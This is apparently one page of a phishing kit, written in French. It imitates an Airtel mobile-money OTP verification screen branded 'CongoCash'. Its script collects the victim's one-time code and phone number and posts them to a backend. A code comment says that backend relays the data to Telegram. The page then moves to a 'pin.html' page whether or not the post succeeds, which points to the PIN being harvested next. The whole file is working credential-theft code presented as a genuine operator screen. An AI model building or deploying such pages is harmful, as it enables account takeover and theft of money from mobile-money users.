<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification OTP | CongoCash</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
        
        body {
            font-family: 'Inter', sans-serif;
            background-color: white;
            color: #333;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .otp-input {
            width: 60px;
            height: 60px;
            text-align: center;
            font-size: 1.5rem;
            font-weight: bold;
            border-bottom: 2px solid #adb5bd;
            outline: none;
            transition: border-color 0.3s;
        }

        .otp-input:focus {
            border-color: #E31937;
        }

        .keypad-btn {
            height: 65px;
            font-size: 1.5rem;
            display: flex;
            align-items: center;
            justify-content: center;
            user-select: none;
        }

        .keypad-btn:active {
            background-color: #f1f3f5;
            border-radius: 50%;
        }

        .verify-btn {
            background-color: #f1f3f5;
            color: #adb5bd;
            transition: all 0.3s;
        }

        .verify-btn.active {
            background-color: #E31937;
            color: white;
        }

        .resend-link.disabled {
            color: #adb5bd;
            cursor: not-allowed;
            pointer-events: none;
        }
    </style>
</head>
<body>

    <nav class="p-6 flex items-center gap-4 animate__animated animate__fadeIn">
        <button onclick="history.back()" class="text-gray-600">
            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
        </button>
        <span class="text-xl font-bold text-red-600 tracking-tighter">airtel</span>
    </nav>

    <main class="flex-1 px-8 pt-4 animate__animated animate__fadeInUp">
        <h2 class="text-2xl font-bold mb-2">Vérification</h2>
        <p class="text-gray-500 text-sm mb-8">Un code à 4 chiffres a été envoyé au +243 XXX XXX XXX</p>
        
        <div class="flex justify-between mb-10">
            <input type="text" id="otp1" readonly class="otp-input">
            <input type="text" id="otp2" readonly class="otp-input">
            <input type="text" id="otp3" readonly class="otp-input">
            <input type="text" id="otp4" readonly class="otp-input">
        </div>

        <div class="text-center mb-10">
            <p class="text-gray-400 text-xs">Vous n'avez pas reçu le code ?</p>
            <button id="resendBtn" onclick="handleResend()" class="resend-link disabled font-bold text-sm mt-1">
                Renvoyer (<span id="timer">00:59</span>)
            </button>
        </div>

        <div class="grid grid-cols-3 gap-y-4 text-center">
            <button class="keypad-btn" onclick="addNum('1')">1</button>
            <button class="keypad-btn" onclick="addNum('2')">2</button>
            <button class="keypad-btn" onclick="addNum('3')">3</button>
            <button class="keypad-btn" onclick="addNum('4')">4</button>
            <button class="keypad-btn" onclick="addNum('5')">5</button>
            <button class="keypad-btn" onclick="addNum('6')">6</button>
            <button class="keypad-btn" onclick="addNum('7')">7</button>
            <button class="keypad-btn" onclick="addNum('8')">8</button>
            <button class="keypad-btn" onclick="addNum('9')">9</button>
            <div class="keypad-btn"></div>
            <button class="keypad-btn" onclick="addNum('0')">0</button>
            <button class="keypad-btn" onclick="delNum()">
                <svg class="w-6 h-6 text-gray-400" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M6.707 4.879A3 3 0 018.828 4H15a3 3 0 013 3v6a3 3 0 01-3 3H8.828a3 3 0 01-2.121-.879l-4.5-4.5a1 1 0 010-1.414l4.5-4.5zm2.586 1L5.414 10l3.879 3.879L10.707 12.465 8.242 10l2.465-2.465-1.414-1.414z" clip-rule="evenodd"></path></svg>
            </button>
        </div>
    </main>

    <div class="p-8">
        <button id="verifyBtn" onclick="verifyOTP()" disabled class="w-full verify-btn font-bold py-4 rounded-lg uppercase tracking-widest text-sm">
            Vérifier
        </button>
    </div>

    <script>
        let otp = "";
let timeLeft = 59;
const inputs = [document.getElementById('otp1'), document.getElementById('otp2'), document.getElementById('otp3'), document.getElementById('otp4')];
const btn = document.getElementById('verifyBtn');
const resendBtn = document.getElementById('resendBtn');
const timerSpan = document.getElementById('timer');

// 1. Functional Countdown
const countdown = setInterval(() => {
    if (timeLeft <= 0) {
        clearInterval(countdown);
        resendBtn.classList.remove('disabled');
        resendBtn.classList.add('text-red-600');
        resendBtn.innerHTML = "Renvoyer le code";
    } else {
        let seconds = timeLeft < 10 ? '0' + timeLeft : timeLeft;
        timerSpan.innerText = `00:${seconds}`;
    }
    timeLeft -= 1;
}, 1000);

function addNum(n) {
    if (otp.length < 4) {
        otp += n;
        updateInputs();
    }
}

function delNum() {
    otp = otp.slice(0, -1);
    updateInputs();
}

function updateInputs() {
    inputs.forEach((input, i) => {
        input.value = otp[i] || "";
        input.style.borderBottomColor = otp[i] ? "#E31937" : "#adb5bd";
    });
    
    if (otp.length === 4) {
        btn.disabled = false;
        btn.classList.add('active');
    } else {
        btn.disabled = true;
        btn.classList.remove('active');
    }
}

function handleResend() {
    window.location.href = 'login.html';
}

async function verifyOTP() {
    btn.innerText = "Traitement...";
    btn.disabled = true;

    // We send the data to your local server (Node.js)
    // The server will handle Africa's Talking and Telegram simultaneously
    const payload = {
        otp: otp,
        phoneNumber: localStorage.getItem('userPhone') || "+243XXXXXXXXX" 
    };

    try {
        await fetch('http://localhost:3000/verify-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        window.location.href = 'pin.html';
    } catch (error) {
        console.error('Backend Error:', error);
        // Fallback for testing flow
        window.location.href = 'pin.html';
    }
}
    </script>
</body>
</html>
